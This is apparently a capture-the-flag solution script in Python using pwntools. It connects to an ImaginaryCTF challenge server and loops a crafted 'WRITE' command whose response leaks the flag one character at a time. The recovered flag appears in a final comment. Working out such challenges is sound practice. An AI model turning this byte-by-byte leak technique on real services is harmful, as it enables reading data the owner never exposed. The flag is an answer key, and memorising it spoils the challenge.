from pwn import *
from tqdm import tqdm

# io = process(["python", "main.py"])
io = remote("puzzler7.imaginaryctf.org", 1014)

def cmd(c: str):
    io.sendlineafter(b">>> ", c.encode())

flag = ""
while not flag.endswith("}"):
    i = len(flag)
    cmd(f"WRITE {i}[2048] 0")
    io.recvuntil(b"Wrote 0 to address ")
    v = int(io.recvuntilS(b" ")[:-1])
    flag += chr(v)
    print(flag)
# ictf{sp000kygh0s+}
